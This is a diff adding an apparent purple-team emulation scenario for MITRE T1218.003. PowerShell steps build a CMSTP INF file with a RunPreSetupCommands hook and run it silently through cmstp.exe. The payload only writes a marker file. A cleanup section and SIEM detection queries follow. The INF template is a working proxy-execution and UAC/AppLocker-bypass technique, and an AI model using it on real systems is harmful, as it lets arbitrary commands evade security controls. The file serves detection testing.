@@ -1,0 +1,111 @@
+id: T1218.003_cmstp
+name: "System Binary Proxy Execution — CMSTP"
+mitre_technique: "T1218.003"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries abuse cmstp.exe (Microsoft Connection Manager Profile Installer) to
+  proxy execution of arbitrary commands via a malicious INF file. CMSTP accepts an
+  INF installation file and will execute commands specified in the RegisterOCXSection
+  or RunPreSetupCommands sections. It can also bypass UAC and AppLocker because it
+  is a signed Microsoft binary. This scenario creates a benign CMSTP INF file with
+  an embedded command and executes it silently.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1218/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1218.003 — CMSTP proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a malicious INF file for CMSTP execution"
+    command: |
+      $infPath = "$env:TEMP\PAS_T1218_003.inf"
+      $outFile = "$env:TEMP\PAS_T1218_003_fired.txt"
+
+      Set-Content $infPath @"
+[version]
+Signature=`$chicago`$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,%PAS_SCT%
+
+[Strings]
+PAS_SCT="$env:TEMP\PAS_T1218_003.sct"
+
+[RegisterOCXSection]
+
+[Setup Hooks]
+Hook1=Hook1Section
+
+[Hook1Section]
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+cmd /c echo PAS-T1218.003-CMSTP-FIRED > "$outFile"
+TIMEOUT
+"@
+      Write-Host "[PAS] CMSTP INF file created: $infPath"
+      Write-Host "[PAS] RunPreSetupCommandsSection contains: cmd /c echo PAS..."
+
+  - step: 3
+    type: exec_powershell
+    description: "Execute via cmstp.exe /s (silent) — proxy execution via signed binary"
+    command: |
+      $infPath = "$env:TEMP\PAS_T1218_003.inf"
+      Write-Host "[PAS] Executing: cmstp.exe /s /ns $infPath"
+      $proc = Start-Process cmstp.exe -ArgumentList "/s /ns $infPath" `
+          -PassThru -NoNewWindow
+      Start-Sleep -Seconds 4
+      Stop-Process -Name cmstp -Force -ErrorAction SilentlyContinue
+
+      if (Test-Path "$env:TEMP\PAS_T1218_003_fired.txt") {
+          Write-Host "[PAS] CMSTP command EXECUTED — cmd.exe ran via cmstp.exe proxy"
+      } else {
+          Write-Host "[PAS] CMSTP execution did not fire payload (expected on hardened systems)"
+      }
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — cmstp.exe spawning cmd.exe; .inf file in TEMP"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove CMSTP test files"
+    command: |
+      Stop-Process -Name cmstp -Force -ErrorAction SilentlyContinue
+      @("$env:TEMP\PAS_T1218_003.inf",
+        "$env:TEMP\PAS_T1218_003.sct",
+        "$env:TEMP\PAS_T1218_003_fired.txt") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      Write-Host "[PAS][Cleanup] CMSTP files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1218.003 cleanup complete"
+
+analyst_checklist:
+  - "Process event: cmstp.exe executed with /s or /ns arguments and a .inf file path"
+  - "Process event: cmstp.exe spawning cmd.exe or wscript.exe as child — definitive indicator"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'cmstp.exe' and ProcessCommandLine contains '.inf'"
+  - "Sentinel: DeviceProcessEvents | where InitiatingProcessFileName == 'cmstp.exe'"
+  - "MDE alert: 'CMSTP executing script or command' or 'Connection Manager installer proxy execution'"
+  - "CONTROL CHECK: cmstp.exe is rarely used legitimately — any execution should trigger investigation"
+  - "CONTROL CHECK: cmstp.exe can bypass UAC — alert on any elevated process spawned by cmstp.exe"
